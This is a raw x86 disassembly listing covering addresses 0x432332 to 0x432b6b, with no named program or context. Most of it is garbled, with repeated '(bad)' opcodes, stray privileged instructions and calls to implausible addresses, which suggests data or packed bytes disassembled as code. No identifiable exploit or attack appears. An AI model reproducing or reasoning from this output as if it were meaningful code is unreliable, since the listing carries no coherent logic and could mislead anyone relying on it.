  432332:	and    BYTE PTR [ecx-0x38],dl
  432335:	push   eax
  432336:	dec    DWORD PTR [ebx+0xfd885]
  43233c:	mov    BYTE PTR [ebp+0x508bac00],cl
  432342:	mov    WORD PTR [ecx+0x0],ss
  432345:	lea    ecx,[ebx+0x108b20d8]
  43234b:	mov    WORD PTR [edx],ds
  43234d:	add    BYTE PTR [edi+0xff01ff],al
  432353:	mov    ecx,DWORD PTR [ebp-0x28]
  432356:	push   ecx
  432357:	shl    BYTE PTR [ebp+0x3a],0x8b
  43235b:	inc    ebp
  43235c:	in     al,0xeb
  43235e:	jno    0x4322eb
  432360:	push   edx
  432361:	mov    DWORD PTR [eax-0x28],edx
  432364:	mov    eax,DWORD PTR [ebp+0x20]
  432367:	je     0x4322f0
  432369:	mov    eax,DWORD PTR [ecx]
  43236b:	sbb    BYTE PTR [eax],al
  43236d:	pop    DWORD PTR [eax]
  43236f:	add    esi,eax
  432371:	add    bl,al
  432373:	adc    DWORD PTR [edi],esi
  432375:	jmp    0x8bce73c7
  43237a:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  432381:	jne    0x43230e
  432383:	mov    ecx,DWORD PTR [eax]
  432385:	in     al,0x75
  432387:	pop    DWORD PTR [ecx+0x5401]
  43238d:	push   edx
  43238e:	inc    DWORD PTR [ebx]
  432390:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432396:	add    BYTE PTR [edi+0x9],dl
  432399:	call   DWORD PTR [esi]
  43239b:	and    dl,al
  43239d:	and    bh,bh
  43239f:	inc    edi
  4323a1:	test   eax,edx
  4323a3:	sldt   ebx
  4323a6:	xor    al,BYTE PTR [eax]
  4323a8:	pushf  
  4323a9:	(bad)  
  4323aa:	jmp    0x4323b8
  4323ac:	mov    eax,edi
  4323ae:	or     al,0x75
  4323b0:	inc    eax
  4323b1:	call   0x431ab9
  4323b6:	mov    eax,eax
  4323b8:	loopne 0x43233e
  4323ba:	inc    ebp
  4323bb:	add    BYTE PTR [ebx+0x1451c00],cl
  4323c1:	mov    eax,DWORD PTR [ebp+0x20]
  4323c4:	add    edi,ecx
  4323c6:	add    BYTE PTR [eax],ch
  4323c8:	cmp    edi,0x18
  4323cb:	test   DWORD PTR [ebp+0xf],esi
  4323ce:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4323d5:	jne    0x4323d9
  4323d7:	call   0xffa21e9c
  4323dc:	leave  
  4323dd:	rcr    BYTE PTR [esp+eax*4],0x55
  4323e1:	add    ah,ch
  4323e3:	add    BYTE PTR [edi-0x48fef979],dh
  4323e9:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4323f0:	inc    esp
  4323f1:	mov    ebx,DWORD PTR [eax]
  4323f3:	fcom   st(2)
  4323f5:	add    BYTE PTR [edi],bl
  4323f7:	lea    ecx,[eax-0x18]
  4323fa:	(bad)  
  4323fb:	push   DWORD PTR [ecx]
  4323fd:	call   0xffb5715f
  432402:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432406:	fstp   DWORD PTR [esi+ebx*8]
  432409:	push   ebp
  43240a:	pop    ebp
  43240b:	mov    esi,DWORD PTR [edx-0x38]
  43240e:	add    DWORD PTR [eax],0x28
  432411:	mov    edi,DWORD PTR [ebx]
  432413:	xor    esi,DWORD PTR [edx+0x3]
  432416:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43241a:	pop    ebp
  43241b:	or     al,0x4
  43241d:	inc    ecx
  43241e:	push   ebp
  43241f:	(bad)  
  432420:	in     al,dx
  432421:	or     ah,ch
  432423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432424:	xbegin 0xffc89a1a
  43242a:	clc    
  43242b:	adc    al,0x45
  43242d:	div    BYTE PTR [edx]
  43242f:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432436:	test   DWORD PTR [ebx+0x666300f8],ebx
  43243c:	add    BYTE PTR [ecx+0x66],dh
  43243f:	add    eax,DWORD PTR [ebp+0x52]
  432442:	adc    eax,0xffffffa0
  432445:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43244b:	test   DWORD PTR [eax],eax
  43244d:	clc    
  43244e:	data16 or al,BYTE PTR [ebp+0x45]
  432452:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432459:	rol    BYTE PTR [ebp+0x45],1
  43245c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432462:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432468:	push   ebx
  432469:	add    BYTE PTR [eax+eax*1+0x51],dl
  43246d:	jge    0x4324a2
  43246f:	add    BYTE PTR [esi+0x4],dl
  432472:	jne    0x4324d9
  432474:	mov    edx,0x457200
  432479:	jmp    0x43243d
  43247b:	xor    edi,DWORD PTR [ebx]
  43247d:	pop    edi
  43247e:	cvtdq2ps xmm7,xmm0
  432481:	ret    0x0
  432484:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43248a:	xor    ecx,DWORD PTR [edi]
  43248c:	add    eax,DWORD PTR [ecx+0x3b]
  43248f:	push   ebx
  432490:	rdpmc  
  432492:	out    0x8d,al
  432494:	add    BYTE PTR [eax],cl
  432496:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43249c:	ret    0x450c
  43249f:	sbb    al,0x8b
  4324a1:	cmp    eax,esi
  4324a3:	or     cl,al
  4324a5:	or     al,0xc2
  4324a7:	pop    eax
  4324a8:	inc    ebp
  4324a9:	add    ecx,DWORD PTR [edi]
  4324ab:	add    esi,DWORD PTR [ebp+0x39]
  4324ae:	invd   
  4324b0:	jge    0x4324bc
  4324b2:	mov    eax,0x478ac0
  4324b7:	cli    
  4324b8:	xor    esp,ecx
  4324ba:	mov    ebx,0x5b8ac0
  4324bf:	ret    0x33
  4324c2:	mov    eax,0x833b8b
  4324c7:	sub    BYTE PTR [ebx],al
  4324c9:	inc    ebp
  4324ca:	xor    ax,di
  4324cd:	pushf  
  4324ce:	inc    bh
  4324d0:	mov    esp,esp
  4324d2:	hlt    
  4324d3:	test   DWORD PTR [ebp-0x8],esi
  4324d6:	mov    eax,DWORD PTR [ebp-0x14]
  4324d9:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4324df:	dec    edi
  4324e0:	or     BYTE PTR [eax],al
  4324e2:	jne    0x43246d
  4324e4:	mov    esi,esp
  4324e6:	call   0x77a9b0ab
  4324eb:	inc    ebp
  4324ec:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4324f2:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4324f8:	add    BYTE PTR [esi+0x7d],ah
  4324fb:	inc    ebp
  4324fc:	mov    bx,WORD PTR [ebp+0x8]
  432500:	add    DWORD PTR [ebp+0x54],0x30c008b
  432507:	inc    ebp
  432508:	mov    bx,di
  43250b:	lock test BYTE PTR [ecx+0x7000801],bh
  432512:	jge    0x4324d5
  432514:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  43251a:	cli    
  43251b:	xor    bl,bh
  43251d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  432523:	test   BYTE PTR [eax],cl
  432525:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43252c:	cmp    ebp,eax
  43252e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432535:	test   BYTE PTR [ebp+0x1],bh
  432538:	mov    ebx,0x458a00
  43253d:	xor    esi,DWORD PTR [ebx]
  43253f:	add    esp,DWORD PTR [esi-0x77]
  432542:	pop    ebp
  432543:	loopne 0x4325ab
  432545:	inc    ebp
  432546:	clc    
  432547:	xor    edi,DWORD PTR [ebx]
  432549:	add    esi,DWORD PTR [edx-0x77]
  43254c:	data16 fdivr QWORD PTR [ebp-0x49]
  432550:	mov    ebx,0xb78afc
  432555:	hlt    
  432556:	xor    edi,DWORD PTR [esi+eiz*2]
  432559:	add    BYTE PTR [ebp+0x66],bl
  43255c:	data16 lock clc 
  43255f:	cmp    al,0x3b
  432561:	add    BYTE PTR [edi+0x66],dh
  432564:	psubq  mm7,QWORD PTR [ebp+0x2]
  432568:	ltr    WORD PTR [ebp+0x66]
  43256c:	add    esi,eax
  43256e:	add    di,WORD PTR [ebp+0x2b]
  432572:	data16 data16 jge 0x4325f3
  432576:	mov    ebx,0xe08a8b
  43257b:	jge    0x4325b0
  43257d:	data16 data16 xor al,0x5d
  432581:	data16 data16 jne 0x43257d
  432585:	mov    edi,DWORD PTR [ebx]
  432587:	fdiv   QWORD PTR [edx+0x7d]
  43258a:	data16 data16 jge 0x4325c2
  43258e:	mov    ebx,0x758a66
  432593:	mov    esi,0x667233
  432598:	pop    ebp
  432599:	or     BYTE PTR [esi+0x0],ah
  43259c:	clc    
  43259d:	mov    edi,DWORD PTR [ebx]
  43259f:	lock ja 0x43252d
  4325a2:	(bad)  
  4325a4:	jge    0x43259d
  4325a6:	invd   
  4325a8:	pop    ebp
  4325a9:	add    BYTE PTR [ebx],al
  4325ab:	(bad)  
  4325ac:	cmp    di,WORD PTR [ebp+0xf]
  4325b0:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4325b4:	mov    bx,WORD PTR [ebp-0x10]
  4325b8:	pop    bp
  4325ba:	fbstp  TBYTE PTR [ebx]
  4325bc:	test   DWORD PTR [ebx],eax
  4325be:	add    BYTE PTR [ebx],bh
  4325c0:	add    BYTE PTR [esi+0x7d],ah
  4325c3:	jge    0x432550
  4325c5:	data16 in al,dx
  4325c7:	pop    ebp
  4325c8:	stc    
  4325c9:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4325d0:	mov    edi,ebx
  4325d2:	in     al,dx
  4325d3:	test   BYTE PTR [ebp+0x0],bh
  4325d6:	mov    eax,DWORD PTR [eax]
  4325d8:	call   0xbd401f68
  4325dd:	cmp    al,0x9b
  4325df:	add    BYTE PTR [edx],dh
  4325e1:	mov    bx,di
  4325e4:	call   0x8b4ba374
  4325e9:	add    ebp,esp
  4325eb:	mov    bx,di
  4325ee:	jnp    0x432616
  4325f0:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4325f6:	mov    eax,DWORD PTR [eax]
  4325f8:	call   0x7c3eb163
  4325fd:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  432603:	data16 data16 fistp WORD PTR [ebp+0xe]
  432608:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  432612:	fisttp WORD PTR [ecx-0x7401f77b]
  432618:	(bad)  
  432619:	cld    
  43261a:	jne    0x432658
  43261c:	xor    eax,DWORD PTR [eax]
  43261e:	mov    esp,DWORD PTR [esi-0x10]
  432621:	sti    
  432622:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432629:	data16 adc bl,bh
  43262c:	push   ebp
  43262d:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432634:	mov    WORD PTR [eax],es
  432636:	fwait
  432637:	data16 xor bh,bl
  43263a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  432640:	mov    esp,DWORD PTR [esi-0x14]
  432643:	fisttp WORD PTR [ebx-0x3748a9f2]
  432649:	or     al,0x2b
  43264b:	mov    bh,0xba
  43264d:	hlt    
  43264e:	mov    bh,bl
  432650:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432656:	dec    esi
  432657:	or     al,0x0
  432659:	mov    edi,DWORD PTR [ebx]
  43265b:	or     BYTE PTR [ebp+0x3b],dh
  43265e:	mov    ecx,DWORD PTR [edi]
  432660:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432666:	xor    al,0xd8
  432668:	pop    bp
  43266a:	lock xor esi,DWORD PTR [ebx]
  43266d:	lea    esp,[esi+0x1f]
  432670:	icebp  
  432671:	jb     0x432677
  432673:	add    al,al
  432675:	jge    0x432683
  432677:	mov    eax,eax
  432679:	fsubr  st,st(3)
  43267b:	pop    ebp
  43267c:	mov    esi,DWORD PTR [ebx]
  43267e:	in     al,0x8d
  432680:	rcr    DWORD PTR [edi],0xc2
  432683:	jb     0x4326e3
  432685:	add    cl,cl
  432687:	jge    0x432695
  432689:	mov    edx,DWORD PTR [ebp-0x20]
  43268c:	in     al,dx
  43268d:	pop    ebp
  43268e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  432693:	cmp    di,WORD PTR [ebp+0x0]
  432697:	mov    ebp,DWORD PTR [ebx]
  432699:	fdivr  QWORD PTR [esi+0x668a5d]
  43269f:	cmp    al,0x33
  4326a1:	mov    si,0x4e7d
  4326a5:	mov    eax,DWORD PTR [eax]
  4326a7:	lock inc ebp
  4326a9:	mov    esi,DWORD PTR [eax]
  4326ab:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4326b2:	clc    
  4326b3:	(bad)  
  4326b4:	cmp    edi,DWORD PTR [ebx]
  4326b6:	je     0x4326c7
  4326b8:	push   ebx
  4326b9:	loopne 0x4326ca
  4326bb:	dec    ecx
  4326bd:	mov    esp,DWORD PTR [ebp-0x1c]
  4326c0:	int    0xf1
  4326c2:	mov    esi,0x703084d
  4326c7:	pcmpgtd mm6,mm1
  4326ca:	add    BYTE PTR [ebp+0x66],dh
  4326cd:	jmp    0x43269a
  4326cf:	mov    eax,DWORD PTR [ebx]
  4326d1:	lock push ebp
  4326d3:	ror    DWORD PTR [ebp-0x2972feb3],1
  4326d9:	or     bh,dl
  4326db:	jb     0x4326db
  4326dd:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4326e3:	loopne 0x4326e5
  4326e5:	jne    0x4326e9
  4326e7:	data16 add BYTE PTR [esi+eiz*2],dh
  4326eb:	mov    ecx,ebx
  4326ed:	data16 cmp al,0xf1
  4326f0:	add    BYTE PTR [esi+eiz*2],bh
  4326f3:	add    bl,cl
  4326f5:	retw   0xf2
  4326f9:	ret    0x66
  4326fc:	retf   
  4326fd:	enterw 0x4df1,0x19
  432702:	pop    edi
  432703:	jne    0x432686
  432705:	mov    esi,DWORD PTR [eax]
  432707:	call   0x77b7b2a8
  43270c:	xor    ebp,DWORD PTR [ebx]
  43270e:	lea    esp,[esi+0x48]
  432711:	repnz in eax,0x3b
  432714:	add    BYTE PTR [ebp-0x37],dh
  432717:	xor    edx,DWORD PTR [ebp-0x15]
  43271a:	in     al,dx
  43271b:	xor    edx,DWORD PTR [esi+0x40]
  43271e:	mov    DWORD PTR [edi],0x338545fc
  432724:	clc    
  432725:	add    esi,DWORD PTR [ecx]
  432727:	pop    edi
  432728:	pushf  
  432729:	pop    ebx
  43272a:	call   0xff4426f1
  43272f:	mov    edi,eax
  432731:	push   ecx
  432732:	pop    es
  432733:	mov    edi,DWORD PTR [eax]
  432735:	push   esi
  432736:	inc    esi
  432737:	add    bh,BYTE PTR [esi+0x0]
  43273a:	popa   
  43273b:	data16 (bad) 
  43273d:	into   
  43273e:	gs cmp al,0xcd
  432741:	add    BYTE PTR [ecx+0x7ce0866],bh
  432747:	ret    0x66
  43274a:	add    bh,al
  43274c:	add    bh,ah
  43274e:	add    BYTE PTR [ebp+0x31c3f866],al
  432754:	cmp    al,0x9c
  432756:	add    BYTE PTR [esi+0x66],ah
  432759:	into   
  43275a:	ret    
  43275b:	pop    ebp
  43275c:	adc    BYTE PTR [edi+0x0],dl
  43275f:	mov    bh,0x66
  432761:	mov    edi,0xff038dc3
  432766:	jne    0x4327bc
  432768:	lea    edx,[ecx+0x1]
  43276b:	mov    ebx,0xd64ff1
  432770:	sar    DWORD PTR [ebx],1
  432772:	test   BYTE PTR [ebp+0x36],dh
  432775:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432779:	push   edi
  43277a:	xor    BYTE PTR [ebx],0x38
  43277d:	mov    esi,ebx
  43277f:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432785:	ss inc ebp
  432787:	fs pop ebx
  432789:	mov    ebx,0x9c3b30
  43278e:	je     0x4327bb
  432790:	xor    edi,DWORD PTR [ebx+0x668a33]
  432796:	mov    WORD PTR [ebx],?
  432798:	ss mov ebx,0x8b4e64
  43279e:	pop    edi
  43279f:	cmp    ecx,ecx
  4327a1:	jne    0x4327f8
  4327a3:	mov    ebp,esp
  4327a5:	cld    
  4327a6:	push   esi
  4327a7:	pop    ebx
  4327a8:	inc    ebp
  4327a9:	stc    
  4327aa:	xor    BYTE PTR [ebp+0x9bef89c],al
  4327b0:	test   esi,ecx
  4327b2:	clc    
  4327b3:	test   dl,dl
  4327b5:	cmp    bh,bh
  4327b7:	fs pop si
  4327ba:	or     bl,al
  4327bc:	add    cl,BYTE PTR [ebx+0x57665100]
  4327c2:	retf   0x3c45
  4327c5:	xor    BYTE PTR [eax],al
  4327c7:	pushf  
  4327c8:	mov    si,0x85ca
  4327cc:	ret    0xf8
  4327cf:	pop    ebx
  4327d0:	dec    dx
  4327d3:	mov    edx,DWORD PTR [edi-0x76]
  4327d6:	push   edi
  4327d7:	add    al,0xb7
  4327d9:	xor    al,0xba
  4327db:	cmp    al,0x8d
  4327dd:	je     0x4327de
  4327df:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4327e3:	lea    edi,[ebx+0x544fff]
  4327e9:	push   ecx
  4327ea:	cmp    edx,DWORD PTR [ebx+0x75]
  4327ed:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4327f3:	add    BYTE PTR [ebx],dh
  4327f5:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4327fb:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  432802:	mov    ebx,0x3b3b00
  432807:	jne    0x432834
  432809:	mov    DWORD PTR [ebx+0x728afc],edi
  43280f:	xor    esi,DWORD PTR [ebx]
  432811:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432817:	push   edi
  432818:	cmp    esp,ebp
  43281a:	jne    0x43281c
  43281c:	sbb    DWORD PTR [eax],0x8085c3fc
  432822:	clc    
  432823:	inc    esi
  432824:	pop    ebx
  432825:	sti    
  432826:	add    eax,0xeb8bc075
  43282b:	cld    
  43282c:	xor    edi,DWORD PTR ds:0xf8c3855e
  432832:	mov    ecx,DWORD PTR [ecx+edx*2]
  432835:	rol    DWORD PTR [ebp-0x37],0xf
  432839:	mov    DWORD PTR [eax],ecx
  43283b:	inc    edi
  43283c:	(bad)  
  43283d:	in     eax,0xfe
  43283f:	add    bh,bh
  432841:	(bad)  
  432842:	mov    esi,0xc38a5e
  432847:	mov    esi,DWORD PTR [ebx]
  432849:	push   ecx
  43284a:	mov    edi,0xfc4ec7
  43284f:	test   DWORD PTR [ebp-0x8],edx
  432852:	xor    di,ax
  432855:	pushf  
  432856:	sub    ebp,eax
  432858:	inc    ebp
  432859:	(bad)  
  43285a:	sub    edi,edi
  43285c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432862:	inc    ebp
  432863:	add    BYTE PTR [esi+0x2b],ah
  432866:	or     bh,BYTE PTR [edx+0xf8ac2]
  43286c:	cmp    al,0x33
  43286e:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432874:	(bad)  
  432875:	cmp    esi,DWORD PTR [ebx]
  432877:	je     0x432831
  432879:	push   ebx
  43287a:	dec    esi
  43287b:	str    ecx
  43287e:	cmp    esp,DWORD PTR [ebp+0x75]
  432881:	int    0x33
  432883:	mov    edi,0x789085f
  432888:	mov    edx,DWORD PTR [eax]
  43288a:	cld    
  43288b:	add    cl,cl
  43288d:	data16 add al,0xcb
  432890:	push   ebp
  432891:	add    ebp,esp
  432893:	jne    0x432881
  432895:	(bad)  
  432896:	mov    DWORD PTR [ecx],0xd685f7ec
  43289c:	clc    
  43289d:	xlat   BYTE PTR ds:[ebx]
  43289e:	inc    ebp
  43289f:	mov    esi,DWORD PTR [edx]
  4328a1:	push   eax
  4328a2:	pushf  
  4328a3:	in     eax,0x8b
  4328a5:	add    ah,ch
  4328a7:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4328ab:	add    ax,0x72cb
  4328af:	cmp    al,0x0
  4328b1:	add    BYTE PTR [ebp+0x66],al
  4328b4:	(bad)  
  4328b5:	retf   
  4328b6:	lock ret 0x85
  4328ba:	clc    
  4328bb:	inc    bp
  4328bd:	retf   
  4328be:	cmp    eax,0xc77d9cc8
  4328c3:	xor    ah,bh
  4328c5:	pushf  
  4328c6:	test   DWORD PTR [edi-0x8],ebx
  4328c9:	je     0x432910
  4328cb:	xor    esi,DWORD PTR ds:0x7020840
  4328d1:	ror    BYTE PTR [ebp-0x37],0x8d
  4328d5:	push   ebp
  4328d6:	add    esp,ebp
  4328d8:	jb     0x432865
  4328da:	add    BYTE PTR [eax],cl
  4328dc:	dec    ebp
  4328dd:	mov    bh,0x81
  4328df:	push   esi
  4328e0:	push   esp
  4328e1:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4328e8:	xor    al,BYTE PTR [eax]
  4328ea:	mov    edx,DWORD PTR [edi+0x10]
  4328ed:	(bad)  
  4328ee:	scas   eax,DWORD PTR es:[edi]
  4328ef:	ret    0x3b
  4328f2:	jns    0x3b4425e5
  4328f8:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4328fc:	dec    ebp
  4328fd:	or     BYTE PTR [ebx],ch
  4328ff:	ret    0x458b
  432902:	lock jmp 0x4328f6
  432905:	mov    ecx,DWORD PTR [eax]
  432907:	or     BYTE PTR [edi],al
  432909:	mov    ecx,eax
  43290b:	xor    DWORD PTR [edx+0x2],0x0
  43290f:	mov    bh,0xc1
  432911:	adc    BYTE PTR [eax],dh
  432913:	iret   
  432914:	inc    ebp
  432915:	mov    DWORD PTR [ebx],0x4dfff8c4
  43291b:	inc    BYTE PTR [ebx]
  43291d:	ret    0xf8
  432920:	adc    DWORD PTR [esi+0x10],esp
  432923:	clc    
  432924:	dec    ecx
  432925:	fisttp WORD PTR [ecx+0x456604c0]
  43292b:	add    dh,BYTE PTR ds:0x75e0845
  432931:	ret    0x4d
  432934:	lea    ecx,[ebx+0x18728301]
  43293a:	add    BYTE PTR [ebp+0x45],al
  43293d:	xor    ecx,ebp
  43293f:	pushf  
  432940:	add    bh,al
  432942:	add    al,ch
  432944:	inc    ebp
  432945:	test   DWORD PTR [ebx-0x3eba0708],ecx
  43294b:	xor    eax,0x781084d
  432950:	push   esp
  432951:	fwait
  432952:	push   ecx
  432953:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432959:	inc    ebp
  43295a:	cmp    edi,DWORD PTR [ecx]
  43295c:	jbe    0x4328fa
  43295e:	mov    eax,edi
  432960:	or     ah,dh
  432962:	inc    ebp
  432963:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432969:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43296f:	in     al,dx
  432970:	hlt    
  432971:	push   esp
  432972:	push   esp
  432973:	push   ecx
  432974:	push   ecx
  432975:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  43297b:	fwait
  43297c:	fwait
  43297d:	xor    dh,BYTE PTR [edx]
  43297f:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432985:	or     BYTE PTR [ebp+0x7],al
  432988:	mov    eax,ecx
  43298a:	clc    
  43298b:	jb     0x43294e
  43298d:	add    BYTE PTR [ebp+0x55],cl
  432990:	or     DWORD PTR [edi],0xc251d154
  432996:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4329a0:	mov    edi,eax
  4329a2:	or     cl,al
  4329a4:	inc    ebp
  4329a5:	dec    ebp
  4329a6:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4329ac:	or     WORD PTR [ecx],0x899b
  4329b1:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4329b7:	mov    edx,DWORD PTR [ecx+0x8]
  4329ba:	mov    eax,DWORD PTR [ebp-0x8]
  4329bd:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4329c4:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4329ca:	inc    ebp
  4329cb:	dec    eax
  4329cc:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4329d2:	add    edx,DWORD PTR [ecx-0x8]
  4329d5:	mov    ecx,DWORD PTR [ecx]
  4329d7:	clc    
  4329d8:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4329df:	mov    ecx,ebp
  4329e1:	clc    
  4329e2:	(bad)  
  4329e3:	popf   
  4329e4:	inc    DWORD PTR [eax]
  4329e6:	ret    0x8b
  4329e9:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4329ef:	mov    edi,esp
  4329f1:	hlt    
  4329f2:	test   ecx,esi
  4329f4:	clc    
  4329f5:	or     BYTE PTR [ebp+0x7],al
  4329f8:	xor    al,cl
  4329fa:	pushf  
  4329fb:	jb     0x432a30
  4329fd:	add    BYTE PTR [eax-0x3f],al
  432a00:	inc    eax
  432a01:	daa    
  432a02:	inc    ebp
  432a03:	inc    ebp
  432a04:	xor    eax,0x7f80803
  432a09:	dec    ebp
  432a0a:	fwait
  432a0b:	add    esi,DWORD PTR [edx]
  432a0d:	clc    
  432a0e:	cmp    DWORD PTR [ecx],ecx
  432a10:	or     al,0x8
  432a12:	add    al,BYTE PTR [ebp+0x2c]
  432a15:	xor    eax,0x7350845
  432a1a:	or     BYTE PTR [ebp+0x7],cl
  432a1d:	lea    ebx,[ebx-0x748dcdff]
  432a23:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a2a:	mov    edx,DWORD PTR [eax]
  432a2c:	cld    
  432a2d:	dec    ebp
  432a2e:	push   esp
  432a2f:	sub    edx,DWORD PTR [ecx-0x75]
  432a32:	add    eax,0xf172fc
  432a37:	or     BYTE PTR [ebp+0x7],cl
  432a3a:	add    eax,ecx
  432a3c:	or     al,0x72
  432a3e:	add    DWORD PTR [eax],eax
  432a40:	mov    ebx,0x29c2c1
  432a45:	inc    ebp
  432a46:	mov    eax,DWORD PTR [ebx]
  432a48:	cmp    eax,0x3004d1c
  432a4e:	xbegin 0x66c8b648
  432a54:	clc    
  432a55:	or     BYTE PTR [ebp+0x45],al
  432a58:	xor    dh,BYTE PTR ds:0x78b089c
  432a5e:	adc    BYTE PTR [ebp+0x45],cl
  432a61:	lea    eax,[ebp+0x33727501]
  432a67:	add    cl,ch
  432a69:	inc    ebp
  432a6a:	add    bl,ch
  432a6c:	add    BYTE PTR [ebx+0x45850845],cl
  432a72:	je     0x4329ff
  432a74:	push   ebx
  432a75:	or     al,0x85
  432a77:	dec    ebp
  432a78:	std    
  432a79:	mov    bh,bh
  432a7b:	mov    BYTE PTR [ebp-0x75],al
  432a7e:	mov    edi,eax
  432a80:	or     al,0x89
  432a82:	inc    ebp
  432a83:	clc    
  432a84:	mov    esp,esp
  432a86:	hlt    
  432a87:	call   DWORD PTR [edi-0x37]
  432a8a:	push   esp
  432a8b:	or     al,0x51
  432a8d:	push   ebp
  432a8e:	xor    ebp,esp
  432a90:	mov    esi,0x457251
  432a95:	xor    esi,eax
  432a97:	pushf  
  432a98:	inc    ebp
  432a99:	(bad)  
  432a9a:	mov    edi,eax
  432a9c:	or     al,0x85
  432a9e:	add    al,bh
  432aa0:	inc    eax
  432aa2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432aa6:	or     ah,bh
  432aa8:	inc    eax
  432aa9:	push   esp
  432aaa:	jmp    0x432afd
  432aac:	mov    eax,DWORD PTR ds:0xe8720c
  432ab2:	mov    DWORD PTR [ebp-0x8],eax
  432ab5:	jne    0x432afc
  432ab7:	jmp    0x432a44
  432ab9:	mov    ebp,DWORD PTR [eax]
  432abb:	clc    
  432abc:	retf   0xff54
  432abf:	push   ecx
  432ac0:	mov    DWORD PTR ds:0x757210,eax
  432ac6:	mov    ecx,DWORD PTR [ebp-0x4]
  432ac9:	sub    esp,DWORD PTR [ebx-0x77]
  432acc:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432ad3:	or     ah,bh
  432ad5:	pop    es
  432ad6:	ds fwait
  432ad8:	push   DWORD PTR [edx]
  432ada:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432ae0:	(bad)  
  432ae1:	mov    bh,bh
  432ae3:	jmp    0x432ad1
  432ae5:	leave  
  432ae6:	jne    0x432af0
  432ae8:	call   0x302442
  432aed:	in     al,dx
  432aee:	dec    ebp
  432aef:	add    dh,BYTE PTR [ebx]
  432af1:	add    BYTE PTR [ebx],al
  432af3:	inc    ebp
  432af4:	cmp    esi,DWORD PTR [ecx]
  432af6:	je     0x432a94
  432af8:	mov    eax,edi
  432afa:	or     al,0xf0
  432afc:	add    BYTE PTR [ebp+0x458bf845],al
  432b02:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432b08:	adc    al,0x7
  432b0a:	enter  0x9fc0,0xa5
  432b0e:	rol    BYTE PTR [eax],0x5e
  432b11:	mov    ecx,ecx
  432b13:	or     al,0xc
  432b15:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b1c:	jmp    0x432b1d
  432b1e:	push   ebp
  432b1f:	mov    esp,ebp
  432b21:	cld    
  432b22:	inc    ebp
  432b23:	inc    ebp
  432b24:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b2b:	push   esi
  432b2c:	push   esi
  432b2d:	mov    edi,0x7af080f
  432b32:	add    bh,al
  432b34:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432b3a:	add    BYTE PTR [ecx+0x4540100f],cl
  432b40:	mov    ebp,eax
  432b42:	mov    ebp,edi
  432b44:	lock call edx
  432b47:	fcom   DWORD PTR [ebp+0x45]
  432b4a:	mov    eax,0x148a8b
  432b4f:	push   ecx
  432b50:	enter  0xc145,0x83
  432b54:	cmp    ecx,DWORD PTR [eax]
  432b56:	add    BYTE PTR [ebp+0x4d],al
  432b59:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432b5f:	call   0xffa326ce
  432b64:	cmp    eax,DWORD PTR [ebp-0xc]
  432b67:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432b6b:	push   ebp
